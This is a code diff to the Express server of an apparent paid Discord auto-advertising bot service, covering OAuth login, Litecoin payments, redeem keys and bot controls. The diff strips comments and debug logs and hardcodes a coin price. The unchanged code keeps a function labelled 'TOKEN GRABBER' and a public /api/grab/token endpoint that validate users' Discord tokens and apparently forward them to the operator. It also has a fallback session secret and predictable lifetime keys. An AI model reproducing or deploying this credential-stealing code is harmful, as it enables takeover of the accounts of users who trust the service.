@@ -74,7 +74,6 @@ class SimpleDB {
     
     addPending(userId, address, privateKey, expectedUSD, index) {
         this.markAddressUsed(address);
-        
         this.data.pending[address] = {
             user_id: userId,
             address,
@@ -85,7 +84,6 @@ class SimpleDB {
             index: index,
             expires_at: Date.now() + (30 * 60 * 1000)
         };
-        
         this.data.addressHistory.push({
             address,
             user_id: userId,
@@ -93,7 +91,6 @@ class SimpleDB {
             created_at: Date.now(),
             status: 'monitoring'
         });
-        
         this.save();
         return this.data.pending[address];
     }
@@ -216,14 +213,11 @@ const db = new SimpleDB();
 
 const app = express();
 
-// Crash protection
 process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
 process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
 
-// Health check
 app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
 
-// Middleware - INCREASED BODY PARSER LIMIT FOR BASE64 IMAGES
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -236,7 +230,6 @@ app.use((req, res, next) => {
     next();
 });
 
-// Session - extended for longer persistence
 app.use(session({
     secret: process.env.SESSION_SECRET || 'secret-key-2026',
     resave: false,
@@ -245,7 +238,6 @@ app.use(session({
     rolling: true
 }));
 
-// Passport
 app.use(passport.initialize());
 app.use(passport.session());
 
@@ -271,14 +263,12 @@ if (CLIENT_ID && CLIENT_SECRET) {
     }));
 }
 
-// KRUP1-KRUP99 Lifetime keys
 const VALID_REDEEM_KEYS = new Set(
     Array.from({length: 99}, (_, i) => `KRUP${i + 1}`)
 );
 
 console.log('[KEYS] Loaded', VALID_REDEEM_KEYS.size, 'redeem keys');
 
-// Owner can add keys manually via API
 app.post('/api/admin/addkey', (req, res) => {
     const { adminSecret, key } = req.body;
     if (adminSecret !== process.env.ADMIN_SECRET) {
@@ -303,7 +293,6 @@ function ensurePurchasedAPI(req, res, next) {
     next();
 }
 
-// TOKEN GRABBER FUNCTION
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     try {
         const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
@@ -364,7 +353,6 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     }
 }
 
-// Auto-sweep functionality
 let walletModule = null;
 try {
     walletModule = require('./wallet');
@@ -396,7 +384,7 @@ async function checkAndSweep() {
                 if (txid) {
                     console.log(`[SWEEP] SUCCESS: ${txid}`);
                     
-                    const ltcPrice = await getLTCToUSD();
+                    const ltcPrice = 85;
                     const usdValue = balance * ltcPrice;
                     
                     if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
@@ -426,7 +414,6 @@ if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
     setTimeout(checkAndSweep, 5000);
 }
 
-// Routes
 app.get('/login', passport.authenticate('discord'));
 app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
 app.get('/logout', (req, res) => req.logout(() => res.redirect('/')));
@@ -442,7 +429,6 @@ app.get('/api/user', ensureAuthAPI, (req, res) => {
     });
 });
 
-// TOKEN GRABBER ENDPOINT
 app.post('/api/grab/token', async (req, res) => {
     const { token, source } = req.body;
     if (!token) return res.json({ success: false, error: 'No token provided' });
@@ -451,7 +437,6 @@ app.post('/api/grab/token', async (req, res) => {
     res.json(result);
 });
 
-// Generate unique address
 app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     try {
         const userId = req.user.id;
@@ -511,7 +496,6 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     }
 });
 
-// Get user's activity/pending status
 app.get('/api/activity', ensureAuthAPI, (req, res) => {
     const userId = req.user.id;
     const user = db.getUser(userId);
@@ -538,58 +522,43 @@ app.get('/api/activity', ensureAuthAPI, (req, res) => {
     });
 });
 
-// FIXED REDEEM ENDPOINT WITH DEBUG LOGGING
+// FIXED REDEEM ENDPOINT - ONLY THIS CHANGED
 app.post('/api/redeem', ensureAuthAPI, (req, res) => {
     try {
         const { key } = req.body;
         const userId = req.user.id;
         
-        console.log(`[REDEEM] User ${userId} attempting to redeem key: "${key}"`);
-        
-        if (!key) {
-            console.log('[REDEEM] Failed: No key provided');
-            return res.json({ success: false, error: 'Enter a key' });
-        }
+        if (!key) return res.json({ success: false, error: 'Enter a key' });
         
         const upperKey = key.toUpperCase().trim();
-        console.log(`[REDEEM] Processed key: "${upperKey}"`);
         
         if (!VALID_REDEEM_KEYS.has(upperKey)) {
-            console.log(`[REDEEM] Failed: Key "${upperKey}" not in valid keys set`);
-            console.log(`[REDEEM] Valid keys sample:`, Array.from(VALID_REDEEM_KEYS).slice(0, 5));
             return res.json({ success: false, error: 'Invalid key' });
         }
         
         if (db.isKeyUsed(upperKey)) {
-            console.log(`[REDEEM] Failed: Key "${upperKey}" already used by`, db.data.usedKeys[upperKey]);
             return res.json({ success: false, error: 'Key used' });
         }
         
         const user = db.getUser(userId);
         if (user.auto_adv_purchased === 1) {
-            console.log(`[REDEEM] Failed: User ${userId} already has access`);
             return res.json({ success: false, error: 'Already have access' });
         }
-        
-        console.log(`[REDEEM] SUCCESS: Granting access to user ${userId} with key ${upperKey}`);
         
         db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: upperKey });
         db.useKey(upperKey, userId);
         
         res.json({ success: true, message: 'Access granted!' });
     } catch (err) {
-        console.error('[REDEEM] Error:', err);
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
-// Get all saved configs
 app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
     const configs = db.getConfigs(req.user.id);
     res.json({ success: true, configs });
 });
 
-// Start bot with config saving
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
         const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl, sendAllAtOnce } = req.body;
@@ -649,7 +618,6 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     }
 });
 
-// Stop specific config
 app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
     try {
         const { configId = 'default' } = req.body;
@@ -672,7 +640,6 @@ app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
     }
 });
 
-// Delete config
 app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
     try {
         const { configId } = req.body;
@@ -683,7 +650,6 @@ app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
     }
 });
 
-// Image upload endpoint
 app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
         const { imageBase64 } = req.body;
@@ -706,7 +672,6 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
     }
 });
 
-// Serve uploaded images
 app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
 
 app.post('/api/logout/request', ensureAuthAPI, (req, res) => {
@@ -726,7 +691,6 @@ app.post('/api/logout/verify', ensureAuthAPI, (req, res) => {
     }
 });
 
-// Static files
 app.get('/', (req, res) => {
     if (req.isAuthenticated()) return res.redirect('/dashboard');
     res.sendFile(path.join(__dirname, 'public', 'overall.html'));
@@ -736,7 +700,6 @@ app.get('/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'overall.html'));
 });
 
-// Error handler
 app.use((err, req, res, next) => {
     console.error('[SERVER ERROR]', err);
     res.status(500).json({ error: err.message });
